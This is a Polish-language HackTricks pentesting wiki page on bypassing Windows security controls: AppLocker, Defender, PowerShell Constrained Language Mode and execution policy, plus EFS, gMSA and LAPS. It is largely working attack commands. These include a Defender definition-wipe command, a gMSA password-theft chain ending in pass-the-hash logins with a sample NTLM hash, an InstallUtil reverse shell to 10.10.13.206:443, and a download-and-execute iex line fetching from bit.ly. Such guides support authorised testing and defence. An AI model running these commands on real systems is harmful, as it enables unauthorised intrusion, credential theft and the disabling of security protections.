# Kontrole bezpieczeństwa Windows

{{#include ../../banners/hacktricks-training.md}}

## Zasady AppLocker

Biała lista aplikacji to lista zatwierdzonych aplikacji lub plików wykonywalnych, których obecność i uruchamianie w systemie są dozwolone. Jej celem jest ochrona środowiska przed szkodliwym malware oraz niezatwierdzonym oprogramowaniem, które nie odpowiada konkretnym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to firmowe rozwiązanie Microsoftu do **tworzenia białej listy aplikacji**, które zapewnia administratorom systemu kontrolę nad tym, **które aplikacje i pliki mogą uruchamiać użytkownicy**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalatora Windows, bibliotekami DLL, aplikacjami pakietowymi oraz instalatorami aplikacji pakietowych.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz dostęp do zapisu w określonych katalogach, **ale można to wszystko obejść**.

### Sprawdzenie

Sprawdź, które pliki i rozszerzenia znajdują się na czarnej/białej liście:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ta ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, umożliwiając sprawdzenie bieżącego zestawu reguł wymuszanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Przydatne **foldery z prawem zapisu** do obejścia zasad AppLocker: jeśli AppLocker zezwala na uruchamianie dowolnych plików wewnątrz `C:\Windows\System32` lub `C:\Windows`, istnieją **foldery z prawem zapisu**, których można użyć, aby **obejść te zasady**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Powszechnie **zaufane** pliki binarne [**"LOLBAS's"**](https://lolbas-project.github.io/) również mogą być przydatne do ominięcia AppLocker.
- **Nieprawidłowo napisane reguły również mogą zostać ominięte**
- Na przykład w przypadku **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** można utworzyć **folder o nazwie `allowed`** w dowolnym miejscu, a zostanie on dozwolony.
- Organizacje często koncentrują się również na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
- **Wymuszanie DLL jest bardzo rzadko włączane** ze względu na dodatkowe obciążenie systemu oraz ilość testów wymaganą do zapewnienia, że nic nie przestanie działać. Dlatego używanie **DLL jako backdoorów pomoże w ominięciu AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać kod Powershell** w dowolnym procesie i ominąć AppLocker. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Przechowywanie poświadczeń

### Security Accounts Manager (SAM)

Lokalne poświadczenia znajdują się w tym pliku, a hasła są zahashowane.

### Local Security Authority (LSA) - LSASS

**Poświadczenia** (zahashowane) są **zapisywane** w **pamięci** tego podsystemu z powodów związanych z Single Sign-On.\
**LSA** administruje lokalną **polityką bezpieczeństwa** (polityką haseł, uprawnieniami użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA sprawdza **podane poświadczenia** w pliku **SAM** (podczas logowania lokalnego) oraz komunikuje się z **kontrolerem domeny**, aby uwierzytelnić użytkownika domenowego.

**Poświadczenia** są **zapisywane** wewnątrz **procesu LSASS**: bilety Kerberos, hashe NT i LM oraz łatwo odszyfrowywane hasła.

### Sekrety LSA

LSA może zapisywać niektóre poświadczenia na dysku:

- Hasło konta komputera w Active Directory (w przypadku niedostępnego kontrolera domeny).
- Hasła kont kont Windows services
- Hasła zadań zaplanowanych
- Więcej (hasła aplikacji IIS...)

### NTDS.dit

Jest to baza danych Active Directory. Występuje wyłącznie na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to program antywirusowy dostępny w Windows 10 i Windows 11 oraz w wersjach Windows Server. **Blokuje** popularne narzędzia pentestingowe, takie jak **`WinPEAS`**. Istnieją jednak sposoby na **ominięcie tych zabezpieczeń**.

### Sprawdzanie

Aby sprawdzić **status** programu **Defender**, możesz wykonać cmdlet PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy ochrona jest aktywna):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby go wyliczyć, możesz również uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS zabezpiecza pliki za pomocą szyfrowania, wykorzystując **klucz symetryczny** znany jako **File Encryption Key (FEK)**. Ten klucz jest szyfrowany za pomocą **klucza publicznego** użytkownika i przechowywany wewnątrz **alternatywnego strumienia danych** $EFS zaszyfrowanego pliku. Gdy konieczne jest odszyfrowanie, odpowiedni **klucz prywatny** certyfikatu cyfrowego użytkownika służy do odszyfrowania FEK ze strumienia $EFS. Więcej informacji można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze odszyfrowywania bez inicjowania przez użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików non-EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania zapewnia właścicielowi **transparent access** do zaszyfrowanych plików. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi odszyfrowania.

**Najważniejsze informacje**:

- EFS używa symetrycznego FEK, szyfrowanego za pomocą klucza publicznego użytkownika.
- Odszyfrowywanie wykorzystuje klucz prywatny użytkownika w celu uzyskania dostępu do FEK.
- Automatyczne odszyfrowywanie występuje w określonych warunkach, takich jak kopiowanie do FAT32 lub transmisja przez sieć.
- Właściciel ma dostęp do zaszyfrowanych plików bez wykonywania dodatkowych czynności.

### Sprawdzanie informacji EFS

Sprawdź, czy **user** **used** tę **service**, sprawdzając, czy istnieje ta ścieżka:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **access** do pliku, używając cipher /c \<file>\
Możesz również użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **encrypt** i **decrypt** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Będąc Authority System

Ta metoda wymaga, aby **victim user** miał uruchomiony **process** na hoście. Jeśli tak jest, używając sesji `meterpreter`, możesz zaimpersonować token procesu użytkownika (`impersonate_token` z `incognito`). Możesz też po prostu wykonać `migrate` do procesu użytkownika.

#### Znając hasło użytkownika


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft opracował **Group Managed Service Accounts (gMSA)** w celu uproszczenia zarządzania service accounts w infrastrukturach IT. W przeciwieństwie do tradycyjnych service accounts, w których często włączone jest ustawienie "**Password never expire**", gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatic Password Management**: gMSA używają złożonego, 240-znakowego hasła, które automatycznie zmienia się zgodnie z polityką domeny lub komputera. Proces ten jest obsługiwany przez Microsoft's Key Distribution Service (KDC), eliminując potrzebę ręcznych aktualizacji haseł.
- **Enhanced Security**: Te konta są odporne na blokady i nie mogą być używane do interaktywnych logowań, co zwiększa ich bezpieczeństwo.
- **Multiple Host Support**: gMSA mogą być współdzielone między wieloma hostami, dzięki czemu idealnie nadają się do usług uruchomionych na wielu serwerach.
- **Scheduled Task Capability**: W przeciwieństwie do managed service accounts, gMSA obsługują uruchamianie scheduled tasks.
- **Simplified SPN Management**: System automatycznie aktualizuje Service Principal Name (SPN), gdy zmieniają się dane sAMaccount lub nazwa DNS komputera, upraszczając zarządzanie SPN.

Hasła gMSA są przechowywane we właściwości LDAP _**msDS-ManagedPassword**_ i są automatycznie resetowane co 30 dni przez Domain Controllers (DCs). To hasło, będące zaszyfrowanym blobem danych znanym jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może zostać pobrane wyłącznie przez autoryzowanych administratorów oraz serwery, na których zainstalowano gMSA, co zapewnia bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest zabezpieczone połączenie, takie jak LDAPS, lub połączenie musi być uwierzytelnione za pomocą 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Możesz odczytać to hasło za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Znajdź więcej informacji w tym poście**](https://cube0x0.github.io/Relaying-for-gMSA/)

Sprawdź również tę [stronę internetową](https://cube0x0.github.io/Relaying-for-gMSA/) opisującą, jak przeprowadzić **NTLM relay attack**, aby **odczytać** **hasło** użytkownika **gMSA**.<sup>[[1]](#references)</sup>

### Wykorzystanie łączenia ACL do odczytu zarządzanego hasła gMSA (GenericAll -> ReadGMSAPassword)

W wielu środowiskach użytkownicy z niskimi uprawnieniami mogą uzyskać dostęp do sekretów gMSA bez kompromitacji DC, wykorzystując nieprawidłowo skonfigurowane ACL obiektów:<sup>[[3]](#references)</sup>

- Grupie, którą możesz kontrolować (np. za pomocą GenericAll/GenericWrite), przyznano `ReadGMSAPassword` dla konta gMSA.
- Dodając siebie do tej grupy, dziedziczysz uprawnienie do odczytu obiektu `msDS-ManagedPassword` gMSA przez LDAP i możesz uzyskać możliwe do wykorzystania poświadczenia NTLM.

Typowy przebieg:

1) Odkryj ścieżkę za pomocą BloodHound i oznacz swoje główne konta jako Owned. Szukaj krawędzi takich jak:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodaj siebie do kontrolowanej przez siebie grupy pośredniej (przykład z bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Odczytaj zarządzane hasło gMSA za pośrednictwem LDAP i wyprowadź hash NTLM. NetExec automatyzuje pobieranie atrybutu `msDS-ManagedPassword` oraz konwersję do NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Uwierzytelnij się jako gMSA, używając hasha NTLM (nie jest potrzebny tekst jawny). Jeśli konto znajduje się w grupie Remote Management Users, WinRM zadziała bezpośrednio:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notatki:
- Odczyty LDAP `msDS-ManagedPassword` wymagają sealing (np. LDAPS/sign+seal). Tools obsługują to automatycznie.
- gMSA często otrzymują lokalne uprawnienia, takie jak WinRM; sprawdź członkostwo w grupach (np. Remote Management Users), aby zaplanować lateral movement.
- Jeśli potrzebujesz bloba tylko do samodzielnego obliczenia NTLM, zobacz strukturę MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, dostępne do pobrania ze strony [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnego Administratora. Hasła te, które są **randomized**, unikalne i **regularly changed**, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony za pomocą ACL do autoryzowanych użytkowników. Przyznanie wystarczających uprawnień umożliwia odczytywanie haseł lokalnego administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blokuje wiele funkcji** potrzebnych do efektywnego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie wyłącznie na zatwierdzone typy .NET, workflows oparte na XAML, klasy PowerShell i inne.

### **Sprawdź**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
W obecnych wersjach Windows ten Bypass nie zadziała, ale możesz użyć[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, może być konieczne** **dodanie** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodanie `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` oraz **zmiana projektu na .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Odwrócona powłoka:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać kod Powershell** w dowolnym procesie i omijać tryb ograniczony. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Execution Policy PS

Domyślnie jest ustawiona na **restricted.** Główne sposoby ominięcia tej zasady:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Jest to API, którego można używać do uwierzytelniania użytkowników.

SSPI odpowiada za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. Następnie SSPI negocjuje, który protokół uwierzytelniania zostanie użyty. Te protokoły uwierzytelniania nazywane są Security Support Provider (SSP), znajdują się na każdej maszynie Windows w postaci biblioteki DLL, a obie maszyny muszą obsługiwać ten sam protokół, aby móc się komunikować.

### Główne SSP

- **Kerberos**: Preferowany
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Ze względów kompatybilności
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serwery Web i LDAP, hasło w postaci skrótu MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Służy do negocjowania używanego protokołu (Kerberos lub NTLM, przy czym Kerberos jest domyślny)
- %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może zaoferować kilka metod lub tylko jedną.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia **wyświetlanie monitu o zgodę na działania wymagające podwyższonych uprawnień**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
